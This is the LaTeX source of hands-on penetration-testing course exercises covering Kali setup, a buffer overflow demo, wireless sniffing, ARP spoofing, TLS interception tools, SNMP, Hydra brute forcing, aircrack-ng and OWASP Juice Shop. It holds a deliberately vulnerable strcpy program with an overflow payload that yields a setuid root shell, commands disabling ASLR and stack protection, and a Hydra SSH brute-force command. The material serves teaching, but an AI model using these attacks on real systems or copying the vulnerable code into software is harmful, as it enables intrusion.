\documentclass[a4paper,11pt,notitlepage]{report}
% Henrik Kramselund  , February 2001
% hlk@security6.net,
% My standard packages
\usepackage{zencurity-network-exercises}

\begin{document}

\rm
\selectlanguage{english}

\newcommand{\emne}[1]{Communication and Network Security workshop}
\newcommand{\kursus}[1]{Communication and Network Security workshop}
\newcommand{\kursusnavn}[1]{Communication and Network Security workshop\\ exercises}

\mytitle{Penetration Testing}{exercises}

\pagenumbering{roman}

\setcounter{tocdepth}{0}

\normal

{\color{titlecolor}\tableofcontents}
%\listoffigures - not used
%\listoftables - not used

\normal
\pagestyle{fancyplain}
\chapter*{\color{titlecolor}Preface}
\markboth{Preface}{}

This material is prepared for use in \emph{\kursus} and was prepared by
Henrik Kramselund  , \link{http://www.zencurity.com} .
It describes the networking setup and
applications for trainings and workshops where hands-on exercises are needed.

\vskip 1cm
Further a presentation is used which is available as PDF from kramse@Github\\
Look for \jobname in the repo security-courses.

These exercises are expected to be performed in a training setting with network connected systems. The exercises use a number of tools which can be copied and reused after training. A lot is described about setting up your workstation in the repo

\link{https://github.com/kramse/kramse-labs}



\section*{\color{titlecolor}Prerequisites}

This material expect that participants have a working knowledge of
TCP/IP from a user perspective. Basic concepts such as web site addresses and email should be known as well as IP-addresses and common protocols like DHCP.

\vskip 1cm
Have fun and learn
\eject

% =================== body of the document ===============
% Arabic page numbers
\pagenumbering{arabic}
\rhead{\fancyplain{}{\bf \chaptername\ \thechapter}}

% Main chapters
%---------------------------------------------------------------------
% gennemgang af emnet
% check questions


\chapter*{\color{titlecolor}Introduction to networking}
%\markboth{Introduktion til netv√¶rk}{}
\label{chap:intro}

\section*{\color{titlecolor}IP - Internet protocol suite}

It is extremely important to have a working knowledge about IP to implement
secure and robust infrastructures. Knowing about the alternatives while doing
implementation will allow the selection of the best features.

\section*{\color{titlecolor}ISO/OSI reference model}
A very famous model used for describing networking is the ISO/OSI model
of networking which describes layering of network protocols in stacks.

This model divides the problem of communicating into layers which can
then solve the problem as smaller individual problems and the solution
later combined to provide networking.

Having layering has proven also in real life to be helpful, for instance
replacing older hardware technologies with new and more efficient technologies
without changing the upper layers.

In the picture the OSI reference model is shown along side with
the Internet Protocol suite model which can also be considered to have different layers.


\begin{figure}[H]
\label{fig:osi}
\begin{center}
\colorbox{white}{\includegraphics[width=8cm,angle=90]{images/compare-osi-ip.pdf}}
\end{center}
\caption{OSI og Internet Protocol suite}
\end{figure}


\chapter*{\color{titlecolor}Exercise content}
\markboth{Exercise content}{}

Most exercises follow the same procedure and has the following content:
\begin{itemize}
\item {\bf Objective:} What is the exercise about, the objective
\item {\bf Purpose:} What is to be the expected outcome and goal of doing this exercise
\item {\bf Suggested method:} suggest a way to get started
\item {\bf Hints:} one or more hints and tips or even description how to
do the actual exercises
\item {\bf Solution:} one possible solution is specified
\item {\bf Discussion:} Further things to note about the exercises, things to remember and discuss
\end{itemize}

Please note that the method and contents are similar to real life scenarios and does not detail every step of doing the exercises. Entering commands directly from a book only teaches typing, while the exercises are designed to help you become able to learn and actually research solutions.


\chapter{Download Kali Linux Revealed (KLR) Book 10 min}
\label{ex:downloadKLR}


\hlkimage{3cm}{kali-linux-revealed.jpg}

\emph{Kali Linux Revealed  Mastering the Penetration Testing Distribution}


{\bf Objective:}\\
We need a Kali Linux for running tools during the course. This is open source, and the developers have released a whole book about running Kali Linux.

This is named Kali Linux Revealed (KLR)

{\bf Purpose:}\\
We need to install Kali Linux in a few moments, so better have the instructions ready.

{\bf Suggested method:}\\
Create folders for educational materials. Go to \link{https://www.kali.org/download-kali-linux-revealed-book/}
Read and follow the instructions for downloading the book.

{\bf Solution:}\\
When you have a directory structure for download for this course, and the book KLR in PDF you are done.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.

Kali Linux is a free pentesting platform, and probably worth more than \$10.000

The book KLR is free, but you can buy/donate, and I recommend it.

\chapter{Check your Kali VM, run Kali Linux 30 min}
\label{ex:basicVM}

\hlkimage{10cm}{kali-linux.png}

{\bf Objective:}\\
Make sure your virtual machine is in working order.

We need a Kali Linux for running tools during the course.

{\bf Purpose:}\\
If your VM is not installed and updated we will run into trouble later.

{\bf Suggested method:}\\
Go to \link{https://github.com/kramse/kramse-labs/}

Read the instructions for the setup of a Kali VM.

{\bf Hints:}\\
If you allocate enough memory and disk you wont have problems.

{\bf Solution:}\\
When you have a updated virtualisation software and Kali Linux, then we are good.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.

Kali Linux includes many hacker tools and should be known by anyone working in infosec.


\chapter{Try a system for writing pentest reports 30 min}
\label{ex:pentest-report}

{\LARGE \LaTeX\ is fun!}

{\bf Objective:}\\
Try creating a pentest report!

{\bf Purpose:}\\
We will do a handin requiring you to do a pentest report! So why not look at an example report and system for creating this.


{\bf Suggested method:}\\
Go to \link{https://github.com/kramse/pentest-report}

Read the instructions for the setup of Kali with TeXlive - a \LaTeX\ system.

{\bf Hints:}\\
\LaTeX\ is not the only system that can be used, but one I prefer over wysiwyg text processing. It can be automated!

Also you can add scripts and include results and files directly into the report!

{\bf Solution:}\\
When you have looked at the repo you are done, you dont need to work with this system - its optional.

{\bf Discussion:}\\
Another template is from the Offensive Security OSCP program.

\link{https://www.offensive-security.com/reports/sample-penetration-testing-report.pdf}

and this one suggested by Jack

\link{https://github.com/JohnHammond/oscp-notetaking}


\chapter{Small programs with data types 15min}
\label{ex:c-types}

{\bf Objective:}\\
Try out small programs similar to:
\inputminted{c}{programs/int1.c}

\begin{alltt}
user@Projects:programs$ gcc -o int1 int1.c && ./int1
First debug int is 32767
Second debug int is now -32768
\end{alltt}

{\bf Purpose:}\\
See actual overflows when going above the maximum for the selected types.


{\bf Suggested method:}\\
Compile program as is. Run it. See the problem.

Then try changing the int type, try with signed and unsigned. Note differences

{\bf Hints:}\\
Use a calculator to find the maximum, like $2^{16}$, $2^{32}$ etc.

{\bf Solution:}\\
When you have tried adding one to a value and seeing it going negative, you are done.

{\bf Discussion:}\\




\chapter{Buffer Overflow 101 - 30-40min}
\label{ex:bufferoverflow}


{\bf Objective:}\\
Run a demo program with invalid input - too long.

{\bf Purpose:}\\
See how easy it is to cause an exception.

{\bf Suggested method:}\\

\begin{list2}
\item Small demo program \verb+demo.c+
\item Has built-in shell code, function \verb+the_shell+
\item Compile:
\verb+gcc -o demo demo.c+
\item Run program
\verb+./demo test+
\item Goal: Break and insert return address
\end{list2}

\begin{minted}[fontsize=\footnotesize]{c}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char **argv)
{      char buf[10];
        strcpy(buf, argv[1]);
        printf("%s\n",buf);
}
int the_shell()
{  system("/bin/dash");  }
\end{minted}

NOTE: this demo is using the dash shell, not bash - since bash drops privileges and won't work.

Use GDB to repeat the demo by the instructor.

{\bf Hints:}\\
First make sure it compiles:
\begin{alltt}
\$ gcc -o demo demo.c
\$ ./demo hejsa
hejsa
\end{alltt}

Make sure you have tools installed:
\begin{alltt}
apt-get install gdb
\end{alltt}

Then run with debugger:

\begin{alltt}
\$ gdb demo
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from demo...(no debugging symbols found)...done.
(gdb) {\bf
(gdb) run `perl -e "print 'A'x22; print 'B'; print 'C'"`}
Starting program: /home/user/demo/demo `perl -e "print 'A'x22; print 'B'; print 'C'"`
AAAAAAAAAAAAAAAAAAAAAABC

Program received signal SIGSEGV, Segmentation fault.
0x0000434241414141 in ?? ()
(gdb)
// OR
(gdb) {\bf
(gdb) run $(perl -e "print 'A'x22; print 'B'; print 'C'")}
Starting program: /home/user/demo/demo `perl -e "print 'A'x22; print 'B'; print 'C'"`
AAAAAAAAAAAAAAAAAAAAAABC

Program received signal SIGSEGV, Segmentation fault.
0x0000434241414141 in ?? ()
(gdb)

\end{alltt}

Note how we can see the program trying to jump to address with our data. Next step would be to make sure the correct values end up on the stack.

{\bf Solution:}\\
When you can run the program with debugger as shown, you are done.

{\bf Discussion:}\\

the layout of the program - and the address of the \verb+the_shell+ function can be seen using the command \verb+nm+:
\begin{alltt}\footnotesize
\$ nm demo
0000000000201040 B __bss_start
0000000000201040 b completed.6972
                 w __cxa_finalize@@GLIBC_2.2.5
0000000000201030 D __data_start
0000000000201030 W data_start
0000000000000640 t deregister_tm_clones
00000000000006d0 t __do_global_dtors_aux
0000000000200de0 t __do_global_dtors_aux_fini_array_entry
0000000000201038 D __dso_handle
0000000000200df0 d _DYNAMIC
0000000000201040 D _edata
0000000000201048 B _end
0000000000000804 T _fini
0000000000000710 t frame_dummy
0000000000200dd8 t __frame_dummy_init_array_entry
0000000000000988 r __FRAME_END__
0000000000201000 d _GLOBAL_OFFSET_TABLE_
                 w __gmon_start__
000000000000081c r __GNU_EH_FRAME_HDR
00000000000005a0 T _init
0000000000200de0 t __init_array_end
0000000000200dd8 t __init_array_start
0000000000000810 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
0000000000200de8 d __JCR_END__
0000000000200de8 d __JCR_LIST__
                 w _Jv_RegisterClasses
0000000000000800 T __libc_csu_fini
0000000000000790 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
0000000000000740 T main
                 U puts@@GLIBC_2.2.5
0000000000000680 t register_tm_clones
0000000000000610 T _start
                 U strcpy@@GLIBC_2.2.5
                 U system@@GLIBC_2.2.5
000000000000077c T the_shell
0000000000201040 D __TMC_END__
\end{alltt}

The bad news is that this function is at an address \verb+000000000000077c+ which is hard to input using our buffer overflow, please try \smiley We cannot write zeroes, since strcpy stop when reaching a null byte.

We can compile our program as 32-bit using this, and disable things like ASLR, stack protection also:
\begin{alltt}
sudo apt-get install gcc-multilib
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
gcc -m32 -o demo demo.c -fno-stack-protector -z execstack -no-pie
\end{alltt}

Then you can produce 32-bit executables:
\begin{alltt}\footnotesize
// Before:
user@debian-9-lab:~/demo$ file demo
demo: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=82d83384370554f0e3bf4ce5030f6e3a7a5ab5ba, not stripped
// After - 32-bit
user@debian-9-lab:~/demo$ gcc -m32 -o demo demo.c
user@debian-9-lab:~/demo$ file demo
demo: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5fe7ef8d6fd820593bbf37f0eff14c30c0cbf174, not stripped
\end{alltt}

And layout:
\begin{alltt}\footnotesize
0804a024 B __bss_start
0804a024 b completed.6587
0804a01c D __data_start
0804a01c W data_start
...
080484c0 T the_shell
0804a024 D __TMC_END__
080484eb T __x86.get_pc_thunk.ax
080483a0 T __x86.get_pc_thunk.bx
\end{alltt}


Successful execution would look like this - from a Raspberry Pi:
\begin{alltt}\footnotesize
\$ gcc -o demo demo.c
\$ nm demo | grep the_shell
000104ec T the_shell
\$

...
(gdb) run `perl -e " print 'A'x16; print chr(0xec).chr(04).chr(0x01);" `
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/pi/demo/demo `perl -e " print 'A'x16; print chr(0xec) . chr(04)  . chr (0x01);" `
AAAAAAAAAAAAAAAA
\$
\end{alltt}

Started a new shell.

you can now run the "exploit" - which is the shell function AND the misdirection of the instruction flow by overflow:
\begin{alltt}\footnotesize
pi@raspberrypi:~/demo $ gcc -o demo demo.c
pi@raspberrypi:~/demo $ sudo chown root.root demo
pi@raspberrypi:~/demo $ sudo chmod +s demo
pi@raspberrypi:~/demo $ id
uid=1000(pi) gid=1000(pi) grupper=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
pi@raspberrypi:~/demo $ ./demo `perl -e " print 'A'x16; print chr(0xec).chr(04).chr(0x01);" `
AAAAAAAAAAAAAAAA
# id
uid=1000(pi) gid=1000(pi) euid=0(root) egid=0(root) grupper=0(root),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi),1000(pi)
#

\end{alltt}


\chapter{Zeek on the web 10min}
\label{ex:zeekweb}


{\bf Objective:} \\
Try Zeek Network Security Monitor - without installing it.


{\bf Purpose:}\\
Show a couple of examples of Zeek scripting, the built-in language found in Zeek Network Security Monitor


{\bf Suggested method:}\\
Go to \link{http://try.zeek.org/} and try a few of the examples.

{\bf Hints:}\\
The exercise
\emph{The Summary Statistics Framework} can be run with a specifc PCAP.

\verb+192.168.1.201 did 402 total and 2 unique DNS requests in the last 6 hours.+

{\bf Solution:}\\
You should read the example \emph{Raising a Notice}. Getting output for certain events may be interesting to you.


{\bf Discussion:}\\
Zeek Network Security Monitor is an old/mature tool, but can still be hard to get started using. I would suggest that you always start out using the packages available in your Ubuntu/Debian package repositories.

They work, and will give a first impression of Zeek. If you later want specific features not configured into the binary packet, then install from source.

Also Zeek uses a broctl program to start/stop the tool, and a few config files which we should look at. From a Debian system they can be found in \verb+/etc/bro+ :

\begin{alltt}
root@NMS-VM:/etc/bro# ls -la
drwxr-xr-x   3 root root  4096 Oct  8 08:36 .
drwxr-xr-x 138 root root 12288 Oct  8 08:36 ..
-rw-r--r--   1 root root  2606 Oct 30  2015 broctl.cfg
-rw-r--r--   1 root root   225 Oct 30  2015 networks.cfg
-rw-r--r--   1 root root   644 Oct 30  2015 node.cfg
drwxr-xr-x   2 root root  4096 Oct  8 08:35 site
\end{alltt}


\chapter{Bonus: Configure Mirror Port 10min}
\label{ex:mirrorport}


{\bf Objective:} \\
Mirror ports are a way to copy traffic to Suricata and other devices - for analyzing it. We will go through the steps on a Juniper switch to show how.
Most switches which are configurable have this possibility.


{\bf Purpose:}\\
We want to capture traffic for multiple systems, so we select an appropriate port and copy the traffic. In our setup, we select the uplink port to the internet/router.

It is also possible to buy passive taps, like a fiber splitter, which then takes part of the signal, and is only observable if you look for signal strength on the physical layer.


{\bf Suggested method:}\\
We will configure a mirror port on a Juniper EX2200-C running Junos.

\begin{alltt}
root@ex2200-c# show ethernet-switching-options | display set
set ethernet-switching-options analyzer mirror01 input ingress interface ge-0/1/1.0
set ethernet-switching-options analyzer mirror01 input egress interface ge-0/1/1.0
set ethernet-switching-options analyzer mirror01 output interface ge-0/1/0.0
set ethernet-switching-options storm-control interface all
\end{alltt}

Then configure source ports, the ones in current use and destination to the selected high port.

If using the TP-Link T1500G-10PS then this link should describe the process:\\
{\small\url{https://www.tp-link.com/en/configuration-guides/mirroring_traffic/?configurationId=18210}}

Which describe:
\begin{enumerate}
\item Choose the menu MAINTENANCE > Mirroring
\item Select Edit for the Mirror Session 1
\item In the Destination Port Config section, specify a destination port for the mirroring session, and click Apply
\item In the Source Interfaces Config section, specify the source interfaces and click Apply
\end{enumerate}

Using the command line would be similar to this:
\begin{alltt}
Switch#configure
Switch(config)#monitor session 1 destination interface gigabitEthernet 1/0/7
Switch(config)#monitor session 1 source interface gigabitEthernet 1/0/1-4 both
Switch(config)#monitor session 1 source cpu 1 both
\end{alltt}

The method is very similar across vendors, \verb+monitor session+ is often the same command as shown above.

{\bf Hints:}\\
Selecting a port away from the existing ones allow easy configuration of the source to be like, Source ports 1-4 and destination 7 - and easily expanded when port 5 and 6 are activated.

When checking your own devices this is often called SPAN ports, Mirror ports or similar.

\url{https://en.wikipedia.org/wiki/Port_mirroring}

Cisco has called this Switched Port Analyzer (SPAN) or Remote Switched Port Analyzer (RSPAN), so many will refer to them as SPAN-ports.

{\bf Solution:}\\
When we can see the traffic from the network, we have the port configured - and can run any tool we like. Note: specialized capture cards can often be configured to spread the load of incoming packets onto separate CPU cores for performance. Capturing 100G and more can also be done using switches like the example found on the Zeek web site using an Arista switch 7150.

Cisco also has a feature named RSPAN

\begin{quote}
Remote SPAN (RSPAN): An extension of SPAN called remote SPAN or RSPAN. RSPAN allows you to monitor traffic from source ports distributed over multiple switches, which means that you can centralize your network capture devices. RSPAN works by mirroring the traffic from the source ports of an RSPAN session onto a VLAN that is dedicated for the RSPAN session. This VLAN is then trunked to other switches, allowing the RSPAN session traffic to be transported across multiple switches. On the switch that contains the destination port for the session, traffic from the RSPAN session VLAN is simply mirrored out the destination port.
\end{quote}
Source: {\small\link{https://community.cisco.com/t5/networking-documents/understanding-span-rspan-and-erspan/ta-p/3144951}}



{\bf Discussion:}\\
When is it ethical to capture traffic?


\chapter{Wardriving Up to 30min}
\label{ex:wardriving}

{\bf Objective:}\\
Try putting a network card in monitor mode and sniff wireless networks.

{\bf Purpose:}\\
See that wireless networks dont encrypt MACs addresses and other characteristics - what can be found just by turning on the radio.

{\bf Suggested method:}\\
Insert USB wireless card, make sure your VM has USB 2.0 Hub and allow VM to control the card.

Start monitor mode - maybe card is not wlan0!:\\
\verb+airmon-ng start wlan0+

Start airodump-ng:\\
\verb+airodump-ng wlan0mon+

See the data

{\bf Hints:}\\
Selecting a specific channel can be done using --channel and writing captured packets can be done using -w

{\bf Solution:}\\
When you have an overview of nearby networks you are done.

{\bf Discussion:}\\

Lots of information is available on the internet. One recommended site is: \link{http://www.aircrack-ng}




\chapter{SSL/TLS scanners 15 min}
\label{ex:SSLScanner}

{\bf Objective:}\\
Try the Online Qualys SSLLabs scanner \link{https://www.ssllabs.com/}
Try the command line tool sslscan checking servers - can check both HTTPS and non-HTTPS protocols!

{\bf Purpose:}\\
Learn how to efficiently check TLS settings on remote services.

{\bf Suggested method:}\\
Run the tool against a couple of sites of your choice.

\begin{alltt}\small
root@kali:~# sslscan --ssl2 web.kramse.dk
Version: 1.10.5-static
OpenSSL 1.0.2e-dev xx XXX xxxx

Testing SSL server web.kramse.dk on port 443
...
  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048

Subject:  *.kramse.dk
Altnames: DNS:*.kramse.dk, DNS:kramse.dk
Issuer:   AlphaSSL CA - SHA256 - G2
\end{alltt}

Also run it without \verb+--ssl2+ and against SMTPTLS if possible.

{\bf Hints:}\\
Originally sslscan is from \link{http://www.titania.co.uk} but use the version on Kali, install with apt if not installed.

{\bf Solution:}\\
When you can run and understand what the tool does, you are done.

{\bf Discussion:}\\
SSLscan can check your own sites, while Qualys SSLLabs only can test from hostname




\chapter{Try pcap-diff 15 min}
\label{ex:pcap-diff}

{\bf Objective:}\\
Try both getting an utility tool from Github and running an actual useful tool for comparing packet captures.

{\bf Purpose:}\\
Being able to get tools and scripts from Github makes you more effective.

The tool we need today is \link{https://github.com/isginf/pcap-diff}
{\bf Suggested method:}\\
Git clone the repository, follow instructions for running a packet diff.

Try saving a few packets in a packet capture, then using tcpdump read and write a subset - so you end up with two packet captures:
\begin{alltt}\footnotesize
sudo tcpdump -w icmp-dump.cap
// run ping in another window, which probably creates ARP packets
// Check using tcpdump
sudo tcpdump -r icmp-dump.cap arp
reading from file icmp-dump.cap, link-type EN10MB (Ethernet)
10:06:18.077055 ARP, Request who-has 10.137.0.22 tell 10.137.0.6, length 28
10:06:18.077064 ARP, Reply 10.137.0.22 is-at 00:16:3e:5e:6c:00 (oui Unknown), length 28
10:06:24.776987 ARP, Request who-has 10.137.0.6 tell 10.137.0.22, length 28
10:06:24.777107 ARP, Reply 10.137.0.6 is-at fe:ff:ff:ff:ff:ff (oui Unknown), length 28
// Write the dump - but without the ARP packets:
sudo tcpdump -r icmp-dump.cap -w icmp-dump-no-arp.cap not arp
\end{alltt}

With these pcaps you should be able to do:
\begin{alltt}\footnotesize
sudo pip install scapy
git clone https://github.com/isginf/pcap-diff.git
cd pcap-diff/

$ python pcap_diff.py -i ../icmp-dump.cap -i ../icmp-dump-no-arp.cap -o diff.cap
Reading file ../icmp-dump.cap:
Found 23 packets

Reading file ../icmp-dump-no-arp.cap:
Found 19 packets

Diffing packets:

Found 2 different packets

Writing diff.cap
// Try reading the output packet diff:

$ sudo tcpdump -r diff.cap
reading from file diff.cap, link-type EN10MB (Ethernet)
10:06:24.777107 ARP, Reply 10.137.0.6 is-at fe:ff:ff:ff:ff:ff (oui Unknown), length 28
10:06:24.776987 ARP, Request who-has 10.137.0.6 tell 10.137.0.22, length 28
\end{alltt}

Note: I ran these on a Debian, so I needed the sudo, if you run this on Kali there is no need to use sudo.

{\bf Hints:}\\
Git is one of the most popular software development tools, and Github is a very popular site for sharing open source tools.

{\bf Solution:}\\
When you or your team mate has a running pcap-diff then you are done

{\bf Discussion:}\\
I often find that 90\% of my tasks can be done using existing open source tools.



\chapter{Bonus: EtherApe 10 min}
\label{ex:etherape}

\hlkimage{7cm}{etherape-2018.png}

\begin{quote}
EtherApe is a graphical network monitor for Unix modeled after etherman. Featuring link layer, IP and TCP modes, it displays network activity graphically. Hosts and links change in size with traffic. Color coded protocols display.
Node statistics can be exported.
\end{quote}

{\bf Objective:}\\
Use a tool to see more about network traffic, whats going on in a network.

{\bf Purpose:}\\
Get to know the concept of a node by seeing nodes communicate in a graphical environment.

{\bf Suggested method:}\\
Use the tool from Kali

The main page for the tool is:
\link{https://etherape.sourceforge.io/}

{\bf Hints:}\\
Your built-in network card may not be the best for sniffing. Borrow one from Henrik.

{\bf Solution:}\\
When you have the tool running and showing data, you are done.

{\bf Discussion:}\\


\chapter{ARP spoofing and ettercap 20min}
\label{ex:arp-spoof-ettercap}


\hlkimage{7cm}{ettercap.png}

{\bf Objective:}\\
Use a tool to see more about network traffic, whats going on in a network.

{\bf Purpose:}\\
Start the tool, do a scan and start sniffing between your laptop and the router.

{\bf Suggested method:}
\begin{enumerate}
\item Start the tool using \verb+ettercap --gtk+ to get the graphical version.
\item Select menu Info, Help - and read about unified and bridged sniffing.
\item Start Unified sniffing from Sniff, Unified sniffing - select your network card.
\item Select Hosts - Scan
\end{enumerate}

You should be able to see some hosts. Then the next step would be to initiate attacks - which are menu-driven and easy to perform.

{\bf Hints:}\\
We might be messing to much with the traffic, so attacks wont succeed. Some coordination is needed.

{\bf Solution:}\\
When you can scan for hosts and realize how easy that was, you are done.

{\bf Discussion:}\\
How many admins know about ARP spoofing, ARP poisoning?


\chapter{Bonus: sslstrip 15 min}
\label{ex:sslstrip}

{\bf Objective:}\\
sslstrip \link{https://moxie.org/software/sslstrip/}

{\bf Purpose:}\\
Read about the tool, and lets try to run it - on a single VM.

\begin{quote}
This tool provides a demonstration of the HTTPS stripping attacks that I presented at Black Hat DC 2009. It will transparently hijack HTTP traffic on a network, watch for HTTPS links and redirects, then map those links into either look-alike HTTP links or homograph-similar HTTPS links. It also supports modes for supplying a favicon which looks like a lock icon, selective logging, and session denial. For more information on the attack, see the video from the presentation below.
\end{quote}

{\bf Suggested method:}\\
Make sure tool is installed, Then run it and intercept your own traffic from the same system.

You may run this on the wireless and try intercepting others.

{\bf Hints:}\\
IF you are using wireless - most likely, then make sure to run on the same channel/AP/frequency. Either switch everything to 2.4GHz and have only one AP or just do the mitm on a single host - run browser and mitmproxy on the same VM.

{\bf Solution:}\\
When you have intercepted some traffic you are done, we will spend at least 30-45 minutes doing various mitm related stuff.

{\bf Discussion:}\\



\chapter{Bonus: mitmproxy 30 min}
\label{ex:mitmproxy}

{\bf Objective:}\\
mitmproxy \link{https://mitmproxy.org/}

mitmproxy is a free and open source interactive HTTPS proxy

{\bf Purpose:}\\
Try running a mitm attack on your phone or another laptop.

{\bf Suggested method:}\\
Make sure tool is installed

Then use the command line interface to verify it is working, then switch to the Web interface for playing with the tool.

{\bf Hints:}\\
IF you are using wireless - most likely, then make sure to run on the same channel/AP/frequency. Either switch everything to 2.4GHz and have only one AP or just do the mitm on a single host - run browser and mitmproxy on the same VM.

{\bf Solution:}\\
When you have intercepted some traffic you are done, we will spend at least 30-45 minutes doing various mitm related stuff.

{\bf Discussion:}\\

\chapter{Bonus: sslsplit 10 min}
\label{ex:sslsplit}

{\bf Objective:}\\
Read about sslsplit \link{https://www.roe.ch/SSLsplit}
- transparent SSL/TLS interception system

{\bf Purpose:}\\
This tool has a lot of features described on the home page.

\begin{quote}\small
Overview\\
SSLsplit is a tool for man-in-the-middle attacks against SSL/TLS encrypted network connections. It is intended to be useful for network forensics, application security analysis and penetration testing.

SSLsplit is designed to transparently terminate connections that are redirected to it using a network address translation engine. SSLsplit then terminates SSL/TLS and initiates a new SSL/TLS connection to the original destination address, while logging all data transmitted. Besides NAT based operation, SSLsplit also supports static destinations and using the server name indicated by SNI as upstream destination. SSLsplit is purely a transparent proxy and cannot act as a HTTP or SOCKS proxy configured in a browser.
\end{quote}

{\bf Suggested method:}\\
If we were to use this tool, we would redirect traffic using "firewalls"/routers

\begin{list2}
\item SSLsplit currently supports the following operating systems and NAT engines:
\item FreeBSD: pf rdr and divert-to, ipfw fwd, ipfilter rdr
\item OpenBSD: pf rdr-to and divert-to
\item Linux: netfilter REDIRECT and TPROXY
\item Mac OS X: ipfw fwd and pf rdr
\end{list2}

{\bf We wont run this tool, but beware such tools exist}

{\bf Hints:}\\
Specifically read the section \emph{SSLsplit implements a number of defences against mechanisms} - and think about the consequences to a regular user.

{\bf Solution:}\\
When you feel you have a idea about what this tool can do then you are done.

{\bf Discussion:}\\
Should tools like this even exist?





\chapter{SNMP walk 15min}
\label{ex:snmpwalk}

{\bf Objective:}\\
Run SNMP walk on a switch, \verb+snmpwalk+ see information from device.

Lots of basic information helps defenders - AND attackers.

{\bf Purpose:}\\
SNMP is a default management protocol used in almost any network.

{\bf Suggested method:}\\
Run snmpwalk using community string public.
Command is: \verb+snmpwalk -v 2c -c public system+

%\begin{alltt}
%$
%\end{alltt}

{\bf Hints:}\\
Community strings private and public used to be default for network devices. Today professionel devices have no SNMP configured by default, but lots of networks install the community "public" anyway.

{\bf Solution:}\\
When you have done snmpwalk for at least one device.

{\bf Discussion:}\\
Which part of the information is most relevant to defenders, and attackers.

Also remember on internal LAN segments, use Nmap:
\begin{alltt}
snmp-10.x.y.0.gnmap: nmap -sV -A -p 161 -sU --script=snmp-info -oA snmp-10xy 10.x.y.0/19
snmpscan: nmap -sU -p 161 -oA snmpscan --script=snmp-interfaces -iL targets
\end{alltt}


\chapter{Try Hydra brute force 30min}
\label{ex:hydra-brute}

{\bf Objective:}\\
Try a brute force program named hydra/Xhydra.

You decide which service to attack, SSH or SNMP are good examples.

{\bf Purpose:}\\
Learn that some protocols allow brute forcing.

{\bf Suggested method:} \\
Make a short list of usernames and a short list of passwords
and use hydra to brute force your way into a system. Use the editor \verb+kate+, using \verb+kate users.txt+ and \verb+kate pass.txt+ followed by a command similar to this:
\begin{alltt}
$ hydra -V -t 1 -L users.txt -P pass.txt 10.0.45.2 ssh
\end{alltt}

If you want to attack SNMP try with a small list of community names:
public, private, kramse, etc.


{\bf Hints:} \\
When learning tools create a nice environment and check that things are working
before trying to hack. So with brute forcing an account, create and test it!

{\bf Solution:}\\
When you have found working credentials for at least one service, like SNMP and done SNMPwalk

{\bf Discussion:}\\
The hydra program can brute force a lot of different protocols and also
allow a lot of tuning.

The hydra program does an online brute force attack, in some cases you
can get access to data like password databases, or hash values that can
be cracked in off-line brute force attacks.




\chapter{Aircrack-ng 30 min}
\label{ex:aircrack-ng}

{\bf Objective:}\\
See the program aircrack-ng being used for cracking WEP and WPA-PSK keys.

{\bf Purpose:}\\
Some methods previously used to protect wireless networks should not be used anymore.

{\bf Suggested method:}\\
Get access to a WEP encrypted dump of wireless network traffic and break encryption. Get access to a WPA handshake and try cracking it.


{\bf Hints:}\\
Kali includes the aircrack-ng program and some test data in \\
\verb+/pentest/wireless/aircrack-ng/test+

{\bf Solution:}\\
When you have cracked a network from either testdata or real nearby - our lab network.

{\bf Discussion:}\\
There is a lot of information available about aircrack-ng at the web site:\\
\link{http://www.aircrack-ng.org/}

Another tool available is pyrit and cpyrit which can break WPA-PSK using CUDA enabled graphic cards - instead of 100s of keys/second this may allow 10000s keys/second.

Hashcat also is able to crack WPA \link{https://hashcat.net/hashcat/}





\chapter{Run OWASP Juice Shop 45 min}
\label{ex:sw-startjuice}

\hlkimage{3cm}{JuiceShop_Logo_100px.png}

{\bf Objective:}\\
Lets try starting the OWASP Juice Shop

{\bf Purpose:}\\
We will be doing some web hacking where you will be the hacker. There
will be an application we try to hack, designed to
optimise your learning.

It is named JuiceShop which is written in JavaScript

{\bf Suggested method:}\\
Go to \link{https://github.com/bkimminich/juice-shop}

Read the instructions for running juice-shop - docker is a simple way.

What you need

You need to have browsers and a proxy, plus a basic knowledge of HTTP.

If you could install Firefox it would be great, and we will use the
free version of Burp Suite, so please make sure you can run Java and
download the free version from Portswigger from:

\link{https://portswigger.net/burp/communitydownload}


{\bf Hints:}\\
The application is very modern, very similar to real applications.

The Burp proxy is an advanced tool! Dont be scared, we will use small parts at different times.

{\bf Solution:}\\
When you have a running Juice Shop web application in your team, then we are good.

{\bf Discussion:}\\
It has lots of security problems which can be used for learning
hacking, and thereby how to secure your applications. It is  related
to the OWASP.org Open Web Application Security Project which also has a
lot of resources.

Sources:\\
\url{https://github.com/bkimminich/juice-shop}\\
\url{https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project}

